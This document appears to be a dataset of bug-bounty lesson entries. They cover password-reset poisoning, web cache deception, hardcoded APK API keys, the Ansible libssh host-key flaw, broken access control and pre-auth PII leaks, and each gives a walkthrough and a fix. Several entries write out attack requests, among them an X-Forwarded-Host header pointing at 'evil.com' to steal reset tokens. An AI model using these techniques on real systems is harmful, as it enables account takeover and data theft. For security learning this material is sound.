lesson.example: Consider a fictional site 'target.example' with a hidden API at '/api/legacy/user'. An attacker finds an endpoint 'UpdatePassword' that takes two parameters (pieces of information passed to a program): 'user_email' and 'new_password'. The developer intended this to be used after a token check, but forgot to actually write the code that checks the token. The attacker sends a POST request (a type of message sent to a server to submit data): 'POST /api/legacy/user/UpdatePassword HTTP/1.1 Host: target.example Content-Type: application/json {"user_email": "admin@target.example", "new_password": "hacked123"}'. The server processes this and updates the admin's password because it only checks if the email exists, not if the requester is authorized.
lesson.takeaway: Always hunt for legacy API versions (like SOAP or v1 endpoints) that may have been forgotten by developers, as they often lack modern security checks. Use WSDL files to discover hidden functionality that isn't visible in the main web interface. A key lesson is to never assume that because a security token is generated, the server is actually checking it; always try to perform the action while omitting the token or using an invalid one. Common variants include 'forgot password' flows that only require a user ID or 'email change' flows that don't require the current password.
lesson.fix: To fix this, the 'ResetForgottenPassword' operation must be updated to require a valid, high-entropy (random and complex) reset token. The server must verify that the token is correct, belongs to the specified email, and has not expired before allowing the password change. Additionally, the 'ForgotPassword' operation must be modified to never return the reset token or URL in the API response; it should only be sent to the user's registered email address. Finally, all active sessions (a temporary connection between a user and a server) should be invalidated upon a successful password change to ensure any existing unauthorized access is cut off.

I mean the server would reset any account’s password with just an email address — no token, no old password, no inbox access required. title: Tally Ira’s :- Hardcoded Production Secrets
summary_en: The Tally Ira Android application bundled production API keys in cleartext within its internal asset files, allowing anyone to extract credentials and bypass backend security controls.

lesson.cause: The developers included a .env file—a configuration file typically used to store sensitive environment variables—inside the Flutter asset bundle of the production APK (Android Package). In mobile development, any file packaged within the APK is accessible to the end-user through simple extraction. By failing to remove these development secrets or move them to a secure server-side environment, the application exposed the 'x-api-key' headers required to interact with four separate backend subsystems.
lesson.walkthrough:
RECON
1. The researcher identified the target application as Tally Ira, an AI-powered mobile app distributed as an APK (Android Package, the file format used to install apps on Android).
2. They obtained the production package file named `TallyIra.apk` (version 1.0.14).

DISCOVERY
3. The researcher performed reverse engineering (the process of taking an app apart to see how it works) by unpacking the APK file to view its internal contents.
4. They navigated to the assets folder, specifically looking at the Flutter asset bundle (a collection of files like images and configs used by the Flutter app framework).

EXPLOITATION
5. Inside the directory `assets/flutter_assets/`, the researcher found a file named `.env` (a text file used to store configuration settings).
6. They opened the file and found cleartext (unencrypted, readable text) production API keys for multiple backend services.
7. The file contained the following verbatim path:
`assets/flutter_assets/.env`
Why: This file is meant for local development environments and should never be included in a public app release because it contains sensitive credentials.
8. The researcher identified the specific header used for authentication across the app's cloud services:
`x-api-key`
Why: This header (a piece of data sent with an HTTP request to identify the sender) acted as the only gatekeeper for the backend APIs.

IMPACT
9. The researcher verified that these keys were 'live' by sending test payloads to the backend endpoints (the specific web addresses where the app sends data).
10. Possession of these keys allowed the researcher to bypass several security layers, including account mutation (changing user data) and SMS toll fraud (sending unauthorized text messages).
11. They confirmed the keys granted access to four distinct backend subsystems, effectively compromising the entire application's infrastructure.
lesson.takeaway: Always inspect the 'assets' and 'res/raw' directories of a mobile application for configuration files like .env, settings.json, or credentials.xml. Developers using cross-platform frameworks like Flutter or React Native often forget to exclude environment files from the final build. A key signal is finding an 'x-api-key' or 'Authorization' header in your proxy logs (like Burp Suite) and then searching the app's source code for that specific string to see if it is hardcoded. A common beginner mistake is assuming that 'compiled' apps are encrypted; in reality, they are just compressed archives that are easily opened.
lesson.fix: Production secrets must never be stored on the client side (the mobile app). Instead, the app should communicate with a backend server that the developer controls. That backend server should securely store the API keys and communicate with third-party services on the app's behalf. If a key must be used on the client, it should be a 'public' key with highly restricted permissions and rate-limiting. Developers should also add `.env` to their `.gitignore` and build-exclusion scripts to ensure these files are never packaged into the final APK.

title: The Premium Paradox: A YouTube Music Bug That Worked ONLY in India — Unreproducible in Other…
summary_en: A business logic flaw in YouTube Music allowed non-premium users to download specific songs for offline play, bypassing the paid subscription requirement.

lesson.cause: The vulnerability was caused by inconsistent enforcement of access control rules across different music tracks. While most songs correctly triggered a 'Premium Upgrade' check, certain songs (likely due to metadata errors or regional licensing misconfigurations) failed to verify the user's subscription status before initiating the download process. This allowed the application to treat a paid feature as a free one for specific content.
lesson.walkthrough:
RECON
1. Open the YouTube Music application or website.
2. Log in with a free account that does not have a Premium subscription (a paid service for extra features).

DISCOVERY
3. Search for a standard popular song and click the 'Download' button (a feature to save music for offline use).
4. Observe the 'Upgrade to Premium' popup, which is the expected behavior for free users.
5. Search for a specific, recently popular song (the researcher used a specific Indian track).
6. Click the 'Download' button on this specific song.

EXPLOITATION
7. Observe that the song begins downloading immediately without asking for a subscription.
8. Verify the download by switching the device to 'Offline Mode' (a setting where the internet is disconnected).
9. Play the song successfully to confirm the Premium-only feature is active for free.
10. Identify other songs from the same movie or artist and attempt to download them.
11. Confirm that these related songs also bypass the subscription check.

IMPACT DEMONSTRATION
12. Create a 'Public Playlist' (a list of songs anyone can see via a link).
13. Add all the identified 'free-to-download' songs to this playlist.
14. Share the playlist link with another free account.
15. Confirm the second account can also download the entire list without paying, demonstrating a scalable impact.
lesson.example: Imagine a fictional streaming service called 'MovieStream.example'. They have a 'Pro' plan that allows users to download movies. Usually, when a free user clicks 'Download', the server checks their 'account_status' parameter. If 'account_status' is 'free', it returns an error. However, for movies tagged as 'Promotional', the developers forgot to include this check. An attacker finds that by searching for 'Promotional' movies, they can send a request like 'GET /download?movie_id=123' and the server sends the file because it only checks if the movie exists, not if the user has paid for the download feature.
lesson.takeaway: When hunting for access control bugs, never assume a global rule applies to every single item. Test different categories of content (e.g., different regions, different genres, or different upload dates) to find 'edge cases' where the security check might be missing. A common beginner mistake is giving up after the first 'Access Denied' message; instead, you should look for inconsistencies in how the application handles various data objects.

title: How a Cache Keys Mismatch Led to a Web Cache Deception Account Takeover
summary_en: A URL normalization discrepancy between NGINX and a Node.js backend allowed attackers to trick the cache into storing sensitive API tokens by appending static file extensions to dynamic endpoints.

lesson.cause: The root cause is a mismatch in how two different servers interpret the same URL (web address). The NGINX reverse proxy (a middleman server) was configured to cache any response if the URL ended in static extensions like .css or .js. However, the Node.js origin server (the main application server) was configured to ignore these extensions or treat them as part of the path, still serving private user data. This discrepancy meant NGINX would see a 'static' file and save the private response in its public cache, making it accessible to anyone who visited that specific URL.
lesson.walkthrough:
RECONNAISSANCE
1. Identify that the target uses NGINX as a reverse proxy (a server that sits in front of web servers and forwards client requests).
2. Identify the backend as a Node.js server using Express.js (a framework for building web applications).

DISCOVERY
3. Observe that NGINX is configured to aggressively cache static assets (files that do not change, like images or scripts) to reduce server load.
4. Note the specific file extensions NGINX is programmed to cache: .css, .js, .jpg, .png, and .svg.
5. Identify a dynamic endpoint ( a URL that generates unique data for each user) that returns sensitive information, such as API tokens (secret keys used to prove a user's identity).

EXPLOITATION
6. Understand that a 'normalization discrepancy' exists, meaning the two servers clean up or read the URL differently.
7. The attacker crafts a URL that points to a sensitive endpoint but ends with one of the cached extensions.
8. The attacker tricks a logged-in victim into clicking this crafted link.
9. The victim's browser sends an HTTP request (a message asking for data) to the proxy.
10. NGINX receives the request and sees the static extension (e.g., .css) at the end of the URL.
11. NGINX forwards the request to the Node.js origin server (the server where the application code actually runs).
12. The Node.js server processes the request, ignores the fake extension, and returns the victim's private API tokens in the response.
13. NGINX receives this response and, because the URL ends in .css, it saves (caches) the private data in its public storage.

IMPACT
14. The attacker now visits the exact same URL used by the victim.
15. NGINX finds the 'cached' version of the page and serves the victim's private API tokens directly to the attacker.
16. The attacker uses these tokens to achieve full Account Takeover (gaining complete control of the victim's account).
lesson.example:
Imagine a website where your profile is at 'target.example/api/me'. The site uses a proxy that caches anything ending in '.jpg'. 

1. An attacker sends a victim a link: 'https://target.example/api/me/avatar.jpg'.
2. The victim, logged in, clicks the link. 
3. The backend server sees '/api/me' and ignores the '/avatar.jpg' part, returning the victim's private profile data (email, password hash).
4. The proxy sees '.jpg' and thinks 'This is a public image!' and saves the profile data in its cache.
5. The attacker visits 'https://target.example/api/me/avatar.jpg' and the proxy gives them the victim's private data from the cache. 

This works because the proxy and the backend don't agree on what the URL actually means.
lesson.takeaway: When hunting for Web Cache Deception, look for discrepancies in how proxies and origin servers handle path delimiters (like semicolons, dots, or slashes). Test if appending a fake extension like '/test.css' to a sensitive endpoint still returns the sensitive data while also triggering a cache header like 'X-Cache: HIT'. A common variant involves using encoded characters (like %23 for #) that the proxy ignores but the backend uses to truncate the path. Avoid the mistake of assuming that 'Cache-Control: public' is the only way things get cached; many proxies cache based on file extensions regardless of headers if misconfigured.

excerpt: Web Cache Deception (WCD) occurs when an intermediary caching layer — such as a Content Delivery Network (CDN) or reverse proxy — stores a response containing sensitive user data because it misinterprets a dynamic request as static content. Unlike traditional Web Cache Poisoning, where an attacker injects malicious content into the cache to serve to other users, Web Cache Deception tricks the victim’s browser into making a request that causes the proxy to cache the victim’s private account data under a publicly accessible URL. In this write-up, we will analyze a scenario where a URL normalizat

title: When “Trust On First Use” Trusts the Second Key Too
summary_en: Ansible's libssh transport incorrectly accepts changed SSH host keys when the 'host_key_auto_add' option is enabled, allowing Man-in-the-Middle attackers to intercept credentials.

lesson.cause: The vulnerability stems from a 'lossy' library binding in pylibssh where three distinct SSH states (Unknown, Changed, and Other) were collapsed into a single 'missing_host_key' function. While the original design this was based on (Paramiko) only called this function for truly new hosts, pylibssh triggered it for modified keys as well. Ansible's implementation then treated any call to this function as a signal to automatically trust and save the key, effectively disabling the security check meant to detect server impersonation.
lesson.walkthrough:
RECON
1. The researcher monitors security mailing lists for 'variant hunting'—looking for similar mistakes in different software.
2. They identify a pattern where language bindings (code that lets Python talk to C libraries) lose detail when reporting security errors.

DISCOVERY
3. The researcher examines the 'ansible-pylibssh' source code and finds a mapping dictionary:
KNOW_HOST_MSG_MAP = { libssh.SSH_KNOWN_HOSTS_CHANGED: "Host key for server has changed: ", ... }
Why: This shows the library treats a 'Changed' key (potential attack) the same way it treats an 'Unknown' key (new server).
4. They find the 'verify_knownhost' function which passes these different states to a single hook called 'missing_host_key'.

EXPLOITATION
5. The researcher sets up a local SSH server (a program that allows secure remote login) on 127.0.0.1:2222.
6. They perform 'Run 1' where the server presents 'Host Key A' (a unique digital fingerprint identifying the server).
7. They perform 'Run 2' after replacing 'Host Key A' with 'Host Key B' to simulate an attacker intercepting the connection.
8. They configure Ansible with the following environment variable:
ANSIBLE_LIBSSH_HOST_KEY_AUTO_ADD=true
Why: This setting tells Ansible to automatically accept and save new host keys without asking the user.
9. They run an Ansible playbook (a script that automates tasks on remote servers) against the modified server.

IMPACT
10. Ansible connects to the server with 'Host Key B' without showing any warning to the user.
11. The researcher checks the server logs and confirms the connection was successful:
Accepted password for the controller's user
Why: This proves the 'interceptor' server successfully received the user's secret password because the host key check failed to stop the connection.
lesson.example: Imagine a fictional tool called 'CloudSync' that manages remote servers. It has a feature 'TrustNewServers=True'. Internally, it uses a library that returns 'Error Code 1' for a brand new server and 'Error Code 2' for a server whose identity has changed. However, CloudSync's code looks like this: if (errorCode != 0) { saveKeyToDisk(); continueConnection(); }. An attacker sits between CloudSync and the real server, presenting a fake identity. Because CloudSync sees 'Error Code 2' as just 'not zero', it saves the attacker's fake identity as the 'new' truth and sends the login password directly to the attacker.
lesson.takeaway: When hunting for bugs, look for 'wrapper' libraries that simplify complex security states into a single 'success/fail' or 'missing' category. This 'lossy' translation often hides critical security warnings like key mismatches. Always test 'Auto-Add' or 'Easy-Onboarding' features in automation tools, as they frequently prioritize convenience over the 'Trust On First Use' (TOFU) security model. A common mistake is assuming that 'Auto-Add' only applies to the very first connection; always verify if it also triggers when an existing key changes.

excerpt: Ansible’s libssh transport accepts a **changed** SSH host key when its trust-on-first-use option is enabled. The controller logs in to whoever answers, runs the playbook there, and saves the new key. No warning is shown. title: Account Takeover via Password Reset Poisoning (X-Forwarded-Host)
summary_en: An attacker can hijack user accounts by manipulating the X-Forwarded-Host header to redirect password reset links to a malicious server, capturing the secret reset token.

lesson.cause: The Laravel-based application was configured to trust the X-Forwarded-Host header from any source rather than restricting it to a trusted proxy. This header is an HTTP header (a piece of metadata sent by a browser or proxy) used to tell the backend which domain was originally requested. Because the application used this untrusted header to generate the URL for password reset emails, an attacker could 'poison' the link by providing their own domain.
lesson.walkthrough:
RECON
1. Identify the password reset functionality on the target website (redacted.sa).
2. Observe that the application uses the Laravel framework, which often relies on headers to generate dynamic links.

DISCOVERY
3. Open a tool like Burp Suite (software used to intercept and modify web traffic) to capture the password reset request.
4. Add a custom header to the request to see if the server processes it.

EXPLOITATION
5. Initiate a password reset for a victim's email address.
6. Intercept the outgoing HTTP request (the message sent from your computer to the server).
POST /password/email HTTP/1.1
Host: [redacted].sa
X-Forwarded-Host: evil.com
email=victim@example.com
7. Why: The X-Forwarded-Host header tells the server 'pretend the request came for evil.com'. Since the server doesn't check if this header came from a trusted source, it believes it.
8. The server generates a password reset email and sends it to the victim.
9. The victim receives an email containing a link that looks legitimate but points to the attacker's domain.
https://evil.com/reset-password/{REAL_TOKEN}?email=victim@example.com
10. Why: The {REAL_TOKEN} is a secret code (a unique string of characters) generated by the server to prove the user owns the account. Because the link points to evil.com, the token will be sent to the attacker's server when clicked.

IMPACT
11. The victim clicks the link, and the attacker checks their server logs to find the {REAL_TOKEN}.
12. The attacker goes to the real website and manually constructs the reset URL using the stolen token.
https://[redacted].sa/reset-password/{TOKEN}
13. Why: The token is still valid on the original site because the server generated it; only the domain name in the email was changed.
14. The attacker enters a new password and successfully logs into the victim's account.
lesson.takeaway: Always test how an application handles 'Forwarded' headers (X-Forwarded-Host, X-Forwarded-For, X-Forwarded-Proto). If the application uses these to build URLs sent in emails or used in redirects, it is likely vulnerable to poisoning. A common variant is 'Host Header Injection,' where the standard Host header is modified instead of the X-Forwarded version. Beginners often forget that headers are user-controlled input and should never be trusted for security-sensitive logic like URL generation.

excerpt: When a website uses a proxy such as Cloudflare or a load balancer, requests usually pass through that proxy before reaching the actual server. The proxy can add some HTTP headers to tell the backend more about the original request: * `X-Forwarded-For` tells the backend the original client's IP address. * `X-Forwarded-Proto` tells the backend whether the original connection used HTTP or HTTPS. * `X-Forwarded-Host` tells the backend which hostname was originally requested. These headers are useful, but there is one important thing to understand: the backend should only trust them when they come

title: Broken Access Control: How a Client-Side Role Could Rewrite a Contract from Fixed-Term to Permanent
summary_en: An unauthorized user role was able to modify contract types from fixed-term to permanent by tampering with a hidden request parameter that the server failed to validate.

lesson.cause: The vulnerability stems from a failure in server-side authorization logic where the backend trusted user-supplied input without verifying the user's permissions. While the user interface (UI) restricted the 'EU' role to only viewing contracts, the backend endpoint responsible for saving data did not check if the 'EU' role was allowed to define the 'nature' (contract type) parameter. This allowed a low-privileged user to bypass intended business rules by manually injecting values into an HTTP request.
lesson.walkthrough:
RECON
1. Log into the HR platform using a low-privileged 'EU' (Enterprise User) account.
2. Note that as an EU user, you are intended to only consult (view) contracts, not define their legal classification.

DISCOVERY
3. Navigate to the worker registration section of the application.
4. Open a proxy tool like Burp Suite (a tool used to capture and modify data sent between your browser and a server).
5. Fill out the registration form and click submit to trigger an HTTP request (a message sent by your computer to a server asking it to perform an action).

EXPLOITATION
6. Intercept the POST request (a type of request used to send data to a server) directed at the following endpoint (a specific web address where a server receives data):
POST https://test.com/Patt/creationInterimaire_onEnregistrerCreationInterimaire.action
7. Examine the body of the request to find the parameters (specific pieces of information sent in a request).
8. Locate the 'nature' parameter, which is currently set to 'CDD' (a French term for a fixed-term contract).
nature=CDD
9. Change the value of the 'nature' parameter to 'CDI-I' (representing a permanent or indefinite contract classification).
nature=CDI-I
Why: The researcher is testing if the backend (the server-side code) blindly accepts any value provided by the user, regardless of their account permissions.
10. Forward the modified request to the server.

IMPACT
11. Observe the server's response, which returns an 'HTTP 200 OK' status (a code meaning the server successfully processed the request).
12. Verify in the application UI that the new contract has been successfully created with the 'CDI-I' classification, proving that a restricted user successfully modified a sensitive business field.
lesson.example: Imagine a fictional online banking app at 'bank.example' where a 'Standard User' can only view their balance. When they click 'View Statement', the browser sends a request: POST /api/view_statement?account_id=123&view_only=true. A malicious user intercepts this and changes 'view_only=true' to 'admin_edit=true' and adds a new parameter 'add_balance=1000'. If the server only checks if the user is logged in, but doesn't check if a 'Standard User' is allowed to use the 'admin_edit' flag, the user could successfully add money to their account. The 'admin_edit' flag is the payload (the data sent to achieve the exploit) and the failure to check the user's role against that specific flag is the Broken Access Control.
lesson.takeaway: Always test parameters that look like they define a status, a type, or a permission level (e.g., 'role=user', 'status=pending', 'type=trial'). Even if the web page doesn't show you a button to change these things, the server might still accept the data if you send it manually. A common beginner mistake is assuming that because a button is hidden or 'grayed out' in the browser, the action is secure; in reality, security must be enforced on the server. Look for 'hidden' fields in forms or extra parameters in JSON requests that aren't visible in the UI.

title: How I Found a Pre-Authentication PII Leak Affecting Every User on a Major Indian Deals Platform
summary_en: A major Indian deals platform leaked full names, emails, and referral codes of every user through a login endpoint that required only a phone number and no password or OTP.

lesson.cause: The application's login logic was designed to return a user's full profile data immediately after receiving a phone number to help pre-populate the user interface. This created a security flaw because the server provided sensitive data (PII) before the user proved their identity via an OTP (One-Time Password), which is a temporary security code. The developers prioritized a smooth user experience over the fundamental security principle of verifying identity before granting access to data.
lesson.walkthrough:
RECON
1. The researcher identified the mobile web application of a major Indian deals platform.
2. They monitored the network traffic while attempting to log in to find the specific web address (endpoint) used for authentication.

DISCOVERY
3. The researcher found a specific endpoint used for both logging in and signing up users.
POST /mobile/api/user/loginOrSignupUser
Why: This is an HTTP request (a message sent to a server) using the POST method (used to send data) to a specific URL (endpoint).
4. They observed that the request only required a JSON payload (a data format using labels and values) containing a phone number.
{"primaryPhoneNumber": "98XXXXXXXX"}
Why: The application uses this phone number to look up if a user already has an account.

EXPLOITATION
5. The researcher sent a POST request to the endpoint with a valid 10-digit Indian phone number.
POST /mobile/api/user/loginOrSignupUser
Content-Type: application/json
{"primaryPhoneNumber": "98XXXXXXXX"}
Why: They wanted to see how the server responds before any security code (OTP) is entered.
6. The server immediately responded with a JSON object containing the user's private information.
{
 "user": {
 "id": "12345",
 "name": "John Doe",
 "email": "john@example.com",
 "mobile": "98XXXXXXXX",
 "referralCode": "DEAL123"
 },
 "existingCustomer": true
}
Why: The server leaked PII (Personally Identifiable Information) without requiring any authentication (proof of identity).
7. The researcher confirmed that no cookies (small files used to track sessions) or Authorization headers (security tokens) were needed to get this data.

IMPACT
8. The researcher realized they could automate this process to test thousands of phone numbers (user enumeration).
9. By checking if the 'name' field was filled or null, they could tell exactly which phone numbers were registered on the platform.
10. They noted the lack of rate limiting (a security limit on how many requests can be made in a short time), allowing for mass data harvesting.
lesson.example:
Imagine a fictional website 'target.example' that has a 'Forgot Password' feature. When you type in an email address, the website immediately shows a message: 'Hello Jane Doe, we sent a link to jane.d@gmail.com'. 

An attacker can use a script to send thousands of common email addresses to the endpoint 'POST /api/v1/recovery-check'. 

Request:
POST /api/v1/recovery-check
{"email": "victim@example.com"}

Response:
{"status": "success", "user_found": "Jane Doe", "masked_email": "j***e@gmail.com", "account_level": "Premium"}

This is a vulnerability because the server is giving away the user's real name and account status to anyone who knows the email address, without requiring the user to actually click the recovery link first.
lesson.takeaway: Always test the first step of any login or registration flow to see what data is returned before you provide a password or OTP. Look for 'pre-population' features where the app tries to be helpful by filling in your name or email automatically. A common variant of this is 'User Enumeration,' where the server's response time or error message changes depending on whether a user exists. To find these, use tools like Burp Suite Intruder to send a list of inputs and compare the lengths of the responses. Avoid the mistake of assuming that because an OTP is sent, the data is safe; the data is only safe if it stays on the server until the OTP is verified.
lesson.fix:
The server should never return sensitive PII before authentication is complete. The login flow should be split: Step 1 should only return a generic success message or a simple true/false indicating if an OTP was sent. Only after Step 2 (verifying the OTP) should the server provide a session token that allows the client to fetch user details from a separate, protected endpoint.

@app.route('/api/login', methods=['POST'])
def login_step_one():
    phone = request.json.get('phone')
    user = db.find_user(phone)
    send_otp(phone) # Send code to user's phone
    return jsonify({"message": "OTP sent if user exists"}), 200 # Return NO user data here

title: Broken Access Control Missing Server-Side Authorization Allows Member to Access Billing Data and Modify Any User Profile Including Admins
summary_en: A regular workspace member bypassed frontend restrictions by modifying a JSON response to reveal administrative menus, then successfully edited administrator profiles because the server failed to verify their permissions.

lesson.cause: The application relied on 'security by obscurity' by hiding administrative features in the frontend (the part of the site you see) based on a 'role' property in a JSON response. While the interface was hidden from regular members, the backend (the server processing the data) lacked a Role-Based Access Control check to verify if the user performing an action like 'Update Profile' actually had administrative rights. This allowed any user who knew the correct endpoint to send requests that the server would blindly process.
lesson.walkthrough:
RECON
1. The researcher logged into a collaborative workspace as a 'Member' (a low-privileged user) and noted that the 'Team Management' section was invisible and blocked by a permission warning.
2. They opened Burp Suite (a tool used to intercept and change web traffic) to inspect the HTTP requests (messages sent from the browser to the server) and responses (the server's reply).

DISCOVERY
3. While browsing, they found a JSON response (a text-based data format) that defined their user role.
{
 "tea_wRu2**********": "member"
}
Why: This JSON property tells the browser what the user's role is so the browser knows which buttons to show or hide.

BYPASSING FRONTEND
4. The researcher set up a 'Match & Replace' rule in Burp Suite. This feature automatically swaps specific text in web traffic as it passes through the tool.
5. They configured the rule to find '"member"' and replace it with '"admin"' in every server response.
{
 "tea_wRu2**********": "admin"
}
Why: By tricking the browser into thinking the user is an admin, the frontend unlocks the hidden 'Team Management' and 'Billing' menus.

EXPLOITATION
6. With the UI unlocked, the researcher navigated to the Team Management page.
[TEAM MANAGEMENT / BILLING & USERS PAGE]
Why: The browser now renders the page because it believes the user has permission, even though the server-side account is still just a 'Member'.
7. The researcher attempted to edit the 'Admin' user's profile details, such as their name and profile picture.
8. They submitted the changes, sending a POST request (a request used to send data to a server) to the backend.
9. The server responded with a success message, indicating it processed the change without checking if a 'Member' should be allowed to edit an 'Admin'.

IMPACT
10. To prove the change was permanent, the researcher disabled the Burp Suite rule and refreshed the page.
11. The Admin's profile remained changed, confirming a complete Broken Access Control vulnerability where a low-level user can manage high-level accounts.
lesson.example:
Imagine a website 'target.example' that manages a school. Teachers can edit grades, but students cannot. 

When a student logs in, the server sends: 
`{"user": "student123", "can_edit_grades": false}`. 

The student uses a proxy tool to change that `false` to `true`. Suddenly, an 'Edit Grades' button appears on their screen. 

When the student clicks 'Save' on a new grade, the browser sends a request to: 
`POST /api/v1/update_grade?student_id=456&new_grade=A` 

If the server only checks 'Is this user logged in?' but doesn't check 'Is this user a teacher?', the grade is updated. The vulnerability is that the server trusted the student's request just because they found the hidden button.
lesson.takeaway: Always test if 'hidden' features are actually 'protected' features. If you see a JSON response that defines your permissions (like 'is_admin: false' or 'role: user'), try changing it in your proxy to see if the UI unlocks new areas. Once unlocked, the real test is whether the server lets you SAVE changes in those new areas. A common mistake for beginners is thinking that revealing a button is the bug; the bug is only confirmed when the server executes an action it shouldn't. Look for variants where you can change your 'OrgID' or 'TenantID' in these JSON responses to access other companies' data.
